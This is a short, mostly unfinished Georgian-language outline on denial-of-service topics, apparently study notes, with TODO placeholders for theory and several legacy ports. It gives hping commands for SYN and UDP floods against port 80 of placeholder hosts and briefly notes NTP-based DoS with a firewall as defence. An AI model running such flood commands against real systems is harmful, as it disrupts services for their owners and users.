# თეორია

TODO

# პრაქტიკა

## პორტი 7 (Echo)

TODO

## პორტი 9 (Discard)

TODO

## პორტი 13 (Daytime)

TODO

## პორტი 17 (Quote of the Day)

TODO

## პორტი 19 (Character Generator)

TODO

## NTP

ამ პროტოკოლის სერვისის წინააღმდეგ DoS ატაკა არის შესაძლო.

დაცვა: ფაირვოლი და/ან როუტერი


## Syn Flood

```
hping -i u1 -S -p 80 www.target.com
```

ან

```
hping2 site.com -p 80 -i u30000 -S
```

## UDP Flood

```
hping3 site.com -p 80 -i u30000 --udp
```
